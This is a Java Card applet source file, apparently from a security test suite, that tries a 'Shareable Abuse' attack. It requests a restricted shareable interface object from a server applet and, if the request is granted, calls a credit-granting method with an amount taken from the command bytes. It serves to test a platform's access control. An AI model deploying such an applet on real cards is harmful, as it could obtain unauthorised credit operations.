
/*******************************
 * Package : 01 02 03 04 02
 * 
 * Applet  : 01 02 03 04 02 01 
 * 
 ******************************/
package packageB;

import javacard.framework.*;
import packageA.*;

/**
 *
 * @author swatch
 */
public class ClientAppletB extends Applet{
    
    final static byte CLA_SIMPLEAPPLET                            = (byte) 0xB0;

    final static byte INS_SHAREABLE_ABUSE_ATTACK                  = (byte)0x71;

    private final static short SW_SERVER_NOT_EXISTS               = (short) 0x7001;
    
    private final static short SW_FAILED_TO_OBTAIN_MSI            = (short) 0x7002;
    
    private final static short SW_FAILED_TO_EXECUTE_METHOD        = (short) 0x7003;

    private static byte AID_SERVER[] = {(byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x01, (byte)0x01};
    
    AID serverAID;
    public static MSIB MSIB_SO = null;
    public static MSIC MSIC_SO = null;

    protected ClientAppletB(){
        register();
    }

    protected ClientAppletB(byte[] buffer, short offset, byte length){
        register();
    }

    public static void install(byte[] bArray, short bOffset, byte bLength) throws ISOException{
        new ClientAppletB(bArray, bOffset, bLength );
    }

    public boolean select(){
        return true;
    }

    public void deselect(){
        return;
    }

    public void process(APDU apdu) throws ISOException
    {
        byte[] apduBuffer = apdu.getBuffer();

        if (selectingApplet())
            return;
        
        if (apduBuffer[ISO7816.OFFSET_CLA] == CLA_SIMPLEAPPLET) {
            switch (apduBuffer[ISO7816.OFFSET_INS] ){
                
                case INS_SHAREABLE_ABUSE_ATTACK:
                    shareableAbuseAttack( apdu ) ;
                    break ;

                default :
                    ISOException.throwIt( ISO7816.SW_INS_NOT_SUPPORTED ) ;
                break ;

            }
        }
        else ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
    }

    /**
     * Method to carry out the Shareable Abuse attack
     * @param apdu 
     * 
     * Step 1: Method tries to obtain MSIC type Shareable Interface object.
     * Step 2: If successful, executes method defined in MSIC.
     * Attack is successful if both steps are successful
     */
    public void shareableAbuseAttack(APDU apdu){
        
        byte[]    apdubuf = apdu.getBuffer();
        
        byte b1 = apdubuf[ISO7816.OFFSET_P1];
        byte b2 = apdubuf[ISO7816.OFFSET_P2];
        
        short amount = Util.makeShort(b1, b2);
        
        serverAID = JCSystem.lookupAID(AID_SERVER, (short) 0, (byte) AID_SERVER.length);
        
        if (serverAID == null) 
            ISOException.throwIt(SW_SERVER_NOT_EXISTS);

        /**
         * ClientAppletB request for MSIB type Shareable Interface Object should be allowed.
         * 
         * ClientAppletB request for MSIC type Shareable Interface Object should be prevented.
         * Attack is successful of ClientAppletB is granted MSIC type object 
         */
        MSIC_SO = (MSIC) JCSystem.getAppletShareableInterfaceObject(serverAID, (byte)0);
        
        if (MSIC_SO == null) 
            ISOException.throwIt(SW_FAILED_TO_OBTAIN_MSI);
        
        try{
            MSIC_SO.grantCreditClientC(amount);
        }catch(Exception e){
            ISOException.throwIt(SW_FAILED_TO_EXECUTE_METHOD);
        }     
    }

}
